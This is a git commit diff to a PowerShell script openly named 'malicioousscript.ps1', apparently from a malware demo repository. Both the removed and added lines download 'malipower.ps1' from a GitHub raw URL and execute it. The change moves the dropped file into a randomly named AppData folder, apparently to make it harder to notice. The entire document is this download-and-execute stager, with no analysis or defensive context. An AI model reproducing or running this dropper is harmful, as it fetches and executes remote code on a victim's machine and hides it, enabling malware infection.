950030b35a0ec516be2ef86a13df596425f00c79
tokio-oyama <103776742+tokio-oyama@users.noreply.github.com>
2022-04-15 17:02:27 -0400

    Update malicioousscript.ps1

--- malicioousscript.ps1
+++ malicioousscript.ps1
@@ -1,2 +1,2 @@
-powershell.exe Invoke-WebRequest -Uri https://raw.githubusercontent.com/tokio-oyama/demotet/main/malipower.ps1 -OutFile C:\Users\IEUser\Documents\malipower.ps1; 
-powershell.exe C:\Users\IEUser\Documents\malipower.ps1
+powershell.exe Invoke-WebRequest -Uri https://raw.githubusercontent.com/tokio-oyama/demotet/main/malipower.ps1 -OutFile C:\Users\IEUser\AppData\Local\DKL432BHVYUVTYF643KHJK\malipower.ps1; 
+powershell.exe C:\Users\IEUser\AppData\Local\DKL432BHVYUVTYF643KHJK\malipower.ps1
